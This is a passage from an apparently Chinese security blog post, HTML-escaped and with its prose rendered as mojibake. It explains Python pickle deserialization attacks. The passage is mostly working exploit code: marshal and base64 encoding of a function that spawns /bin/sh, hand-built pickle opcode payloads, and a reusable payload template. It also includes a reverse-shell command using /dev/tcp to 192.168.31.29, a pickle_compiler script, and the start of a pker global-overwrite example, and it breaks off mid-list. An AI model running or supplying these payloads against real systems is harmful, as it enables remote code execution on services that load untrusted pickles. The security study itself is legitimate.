&lt;p>å‰é¢æåˆ°pickleä¸èƒ½åºåˆ—åŒ–ä»£ç å¯¹è±¡ï¼Œæ¥ä¸ªå®ä¾‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>ä½†ä¹Ÿä¸æ˜¯ç»è·¯ä¸€æ¡ï¼Œ&lt;strong>Marshal&lt;/strong>å¯ä»¥è®©è¿™æ®µä»£ç åºåˆ—åŒ–&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç°åœ¨å¾—åˆ°äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒè¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œä½†æ˜¯ç›´æ¥å°†ä»–æ”¾å…¥&lt;code>__reduce__&lt;/code>è¿”å›éƒ¨åˆ†ä¼¼ä¹å¹¶ä¸å¯ä»¥ï¼Œ&lt;code>__reduce__&lt;/code>æ˜¯è°ƒç”¨callableæ¥æ‰§è¡Œå‚æ•°ä¹‹ç±»çš„ï¼Œè€Œæˆ‘ä»¬æ„é€ å¥½çš„æœ¬èº«å°±æ˜¯callableï¼Œå¸Œæœ›å®ƒæ‰§è¡Œè€Œä¸æ˜¯ä½œä¸ºå¦ä¸€ä¸ªcallableçš„å‚æ•°ï¼›è¿™æ—¶å°±éœ€è¦ç›´æ¥ä»PVMæ“ä½œç çš„å±‚çº§è¿›è¡Œæ„é€ äº†ã€‚&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®æˆ‘è§‰å¾—æ›´é€šä¿—çš„ç†è§£æ˜¯è¿™æ ·å¯ä»¥ä¸æŠŠè¦æ‰§è¡Œçš„ä»£ç é™åˆ¶åœ¨&lt;code>return (os.system,(a,))&lt;/code>è¿™æ ·å¼çš„æ¡†æ¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥è‡ªç”±çš„æ‰§è¡Œä»£ç ï¼Œæˆ–è€…è¯´å°±æ˜¯å¦ä¸€ç§å½¢å¼çš„pker&lt;/p>
&lt;p>æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å…¶å®æ˜¯ï¼ˆåˆ©ç”¨åˆ°python oopçš„ç‰¹æ€§ï¼Œé€šè¿‡&lt;code>types.FunctionTyle(func_code,globals(),â€™â€™)()&lt;/code>æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå‚è§ï¼š&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">å®˜æ–¹æ–‡æ¡£&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ›´å¯è¯»ä¸€äº›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¥ä¸‹æ¥å°±æ˜¯æ‰‹åŠ¨æ„é€ opcodeçš„æ—¶å€™äº†ï¼Œå›æƒ³ä¹‹å‰è¿”å›ä¸€ä¸ªç®€å•çš„shellæ—¶çš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¼€å¤´çš„cåé¢è·Ÿçš„æ˜¯å¼•å…¥çš„æ¨¡å—ï¼Œæ¢è¡Œä¹‹åæ˜¯å‡½æ•°ï¼Œå†æ¢è¡Œä¹‹åæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼›æ ¹æ®è¿™ä¸ªç»“æ„æŠŠmarshalå’Œb64åŠ è¿›å»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œglobals()å¯ä»¥åœ¨&lt;code>__builtin__&lt;/code>æ¨¡å—ä¸­å¼•å…¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{}{}&lt;/span>
&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŠŠä¸Šé¢çš„ç¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„payloadï¼Œæ³¨æ„æ·»åŠ &lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#111">FunctionType&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ è¿™ä¸ªäººçœ‹ç€è´¹åŠ²çš„payloadçš„æ¨¡æ¿~ï¼ˆæ¥æºå‚è§ï¼š&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pickleæ‰§è¡Œä¸€ä¸‹é‚£ä¸²payloadçœ‹çœ‹æ•ˆæœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>æˆåŠŸè¿”å›äº†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç»“æœå’Œä¸€ä¸ªshell&lt;/p>
&lt;p>åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯ä»¥ç”¨Marshal+b64çš„æ–¹å¼åå¼¹shellï¼ˆç”¨æ¨¡æ¿ç”Ÿæˆopcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>â€”â€”â€”â€”æˆ–è€…ä¸‹é¢è¿™ä¸ªæ¨¡æ¿ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢çš„æ•ˆæœï¼ˆæ‰§è¡Œä»£ç  è€Œä¸åŒ…å«ç±»å’Œå‡½æ•°ï¼‰ï¼ˆæ¥æºï¼š&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å·¥å…·äºŒè¿---é€šè¿‡upkeruhttpsgithubcomeddieivan01pkeræ„é€ opcode">å·¥å…·äºŒè¿ - é€šè¿‡&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>æ„é€ opcode&lt;/h3>
&lt;p>åŸç†å‚è§ï¼š&lt;a href="https://xz.aliyun.com/t/7012#toc-5">é€šè¿‡ASTæ¥æ„é€ Pickle opcode - è‡ªåŠ¨åŒ–æ„é€ &lt;/a>ï¼Œåˆ©ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pkerä¼šç”¨åˆ°&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>è¿™ä¸‰ç§ç‰¹æ®Šå‡½æ•°å’Œä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼›ä¸‹é¢æ˜¯pkerçš„ç®€å•å°æ —å­ï¼ˆæ›´å¤šä½¿ç”¨è¯´æ˜è¯¦è§ä¸Šé¢çš„é“¾æ¥ï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å…¨å±€å˜é‡è¦†ç›–&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥secretæ¨¡å—ä¸­çš„nameå’Œcategoryæ¨¡å—&lt;/span>
&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
